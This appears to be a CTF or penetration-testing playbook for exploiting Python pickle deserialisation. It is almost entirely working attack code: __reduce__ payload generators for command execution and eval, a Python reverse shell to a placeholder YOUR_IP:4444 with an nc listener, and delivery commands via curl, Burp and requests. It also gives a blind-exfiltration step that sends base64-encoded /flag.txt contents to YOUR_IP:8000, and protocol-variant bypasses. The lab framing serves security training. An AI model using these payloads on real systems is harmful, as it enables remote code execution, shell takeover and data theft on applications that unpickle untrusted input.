
## Goal

Land here because Python Pickle deserialisation is confirmed and you have a known input.

## 1. Identify payload delivery method

- Form field, cookie, POST parameter, or GET parameter → output needed is **base64** → go to 2a
- File upload input → output needed is **a .pkl file** → go to 2b

## 2. Craft your payload

### 2a. Base64 output
##### **i. Command injection payload:**

> [!note]
> `subprocess.check_output` takes a list where the first element is the command and subsequent elements are arguments. So:
> `cat /flag.txt` -> `(['cat', '/flag.txt'],)`
> `whoami` -> `(['whoami'],)`
> `ls -la` -> `(['ls', '-la'],)`
> `uname -a` -> `(['uname', '-a'],)`
> 
> The command name first, then each argument separately.

```python
import pickle, subprocess, base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],)) # When you unpickle/deserialize me run `subprocess.check_output, (['cat', '/flag.txt'],)`

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```
Save as `exploit.py` → replace `cat /flag.txt` with your command (e.g. `whoami`) → run `python3 exploit.py` → copy the base64 output → this is your payload for step 3.

##### **ii. Reverse shell payload:**

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
        return (os.system, (cmd,))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Save as `exploit.py` → replace `YOUR_IP` and `4444` → run `python3 exploit.py` → copy the base64 output → this is your payload for step 3.

`T1> nc -lvnp 4444`

### 2b. `.pkl` file output (file upload)

##### **i. Command injection payload:**

```python
import pickle, subprocess

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

with open('exploit.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```
Save as `exploit.py` → replace `['cat', '/flag.txt']` with your command and arguments → run `python3 exploit.py` → produces `exploit.pkl` → this is your payload for step 3.

##### **ii. Reverse shell payload:**

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
        return (os.system, (cmd,))

with open('exploit.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```
Save as `exploit.py` → replace `YOUR_IP` and `4444` → run `python3 exploit.py` → produces `exploit.pkl` → this is your payload for step 3.

`T1> nc -lvnp 4444`
## 3. Deliver the payload

Your payload is either a base64 string or `exploit.pkl` depending on step 1. It is going into either a fresh input or replacing an existing serialised value.

**Choose the appropriate delivery method below:**

---
> [!note]
> Replace `TARGET`, `endpoint`, and `parameter` throughout → save Python scripts as `deliver.py` → run `python3 deliver.py`.
##### **Via Burp Repeater:** Paste base64 output or upload `exploit.pkl` into the relevant parameter, cookie, form field, or file upload field → send.

##### **Via curl (base64 — POST):**
```bash
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "parameter=YOUR_BASE64_HERE" http://TARGET/endpoint
```

##### **Via curl (base64 — GET):**
```bash
curl "http://TARGET/endpoint?parameter=YOUR_BASE64_HERE"
```

##### **Via curl (file upload):**
```bash
curl -X POST http://TARGET/endpoint -F "file=@exploit.pkl"
```

##### **Via Python requests (base64 — POST):**
```python
import requests

payload = "YOUR_BASE64_HERE"
r = requests.post("http://TARGET/endpoint", data={"parameter": payload})
print(r.text)
```
> [!note]
> Running this Python request will make the request and print the response to the terminal.
##### **Via Python requests (base64 — GET):**
```python
import requests

payload = "YOUR_BASE64_HERE"
r = requests.get("http://TARGET/endpoint", params={"parameter": payload})
print(r.text)
```

##### **Via Python requests (file upload):**
```python
import requests

r = requests.post("http://TARGET/endpoint", files={"file": open("exploit.pkl", "rb")})
print(r.text)
```

## 4. Check output

- Output / flag visible in response → SUCCESS → done
- No output, no error → go to 5
- 400 / 403 → go to 6
- Pickle / deserialisation error → payload malformed → try URL encode your base64 output before delivering AND/OR return to step 2 and double check your payload is correct/valid: 
  ```bash
  python3 -c "import urllib.parse; print(urllib.parse.quote('YOUR_BASE64_HERE'))"
  ```

## 5. Blind path (no output in response)

### 5a. Confirm blind RCE via HTTP callback

`T1> python3 -m http.server 8000`

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://YOUR_IP:PORT/test',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Save as `exploit.py` → replace `YOUR_IP` and `PORT` → run `python3 exploit.py` → deliver via step 3.

- `T1` shows `GET /test` → blind RCE confirmed → go to 5b
- No hit → replace `curl http://YOUR_IP:8000/test` with `ping -c 1 YOUR_IP` → retry
- Still no hit → go to 6
### 5b. Exfiltrate output via HTTP callback

`T1> python3 -m http.server 8000`

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://YOUR_IP:8000/$(cat /flag.txt | base64)',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Save as `exploit.py` → replace `YOUR_IP`, `PORT`, and `cat /flag.txt` → run `python3 exploit.py` → deliver via step 3.

- `T1` shows `GET /BASE64STRING` → decode locally:

```bash
echo "BASE64STRING" | base64 -d
```

- Flag captured → done
- No hit → use reverse shell from step 2 — interactive shell bypasses output visibility entirely

## 6. Bypasses (if payload rejected)

### 6a. Try different pickle protocol versions


```python
import pickle, subprocess, base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

payload0 = base64.b64encode(pickle.dumps(Exploit(), protocol=0)).decode()  # ASCII — least likely to be filtered
payload2 = base64.b64encode(pickle.dumps(Exploit(), protocol=2)).decode()  # Most widely compatible
payload5 = base64.b64encode(pickle.dumps(Exploit(), protocol=5)).decode()  # Newest
print(payload0, payload2, payload5, sep='\n')
```

Replace `['cat', '/flag.txt']` with your command → save as `exploit.py` → run `python3 exploit.py` → try each output in turn via step 3.

### 6b. Use eval with encoded command

```python
import pickle, base64

class Exploit(object):
    def __reduce__(self):
        return (eval, ('__import__("os").system("cat /flag.txt")',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Save as `exploit.py` → replace `cat /flag.txt` → run `python3 exploit.py` → deliver via step 3.

- Any bypass works → return to step 4
- All blocked → DEAD END → document findings and move on